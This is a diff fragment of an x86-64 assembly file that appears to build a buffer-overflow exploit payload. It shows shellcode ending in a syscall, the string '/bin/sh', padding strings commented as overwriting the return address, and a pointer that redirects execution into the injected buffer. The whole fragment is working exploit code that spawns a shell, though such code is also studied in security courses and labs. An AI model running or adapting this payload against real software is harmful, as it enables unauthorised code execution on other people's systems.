@@ -37,11 +37,9 @@ main:
         syscall                          /* invoke syscall */
 
         .ascii  "/bin/sh"
-        .ascii  "aaaaaa"
-        .ascii  "bbbb"
-        .ascii  "cccc"
-        .ascii  "dddd"
-        //.ascii  "eeee"
-        .ascii  "ff"
-        // .ascii  "gggg"
+        .ascii  "aaaa"                   /* pad to overwrite return address */
+        .ascii  "bbbb"                   /* pad to overwrite return address */
+        .ascii  "cccc"                   /* pad to overwrite return address */
+        .ascii  "dddd"                   /* pad to overwrite return address */
+        .ascii  "eeee"                   /* pad to overwrite return address */
         .quad   buffer                   /* buffer ptr (the first instruction of payload), will overwrite real return address */
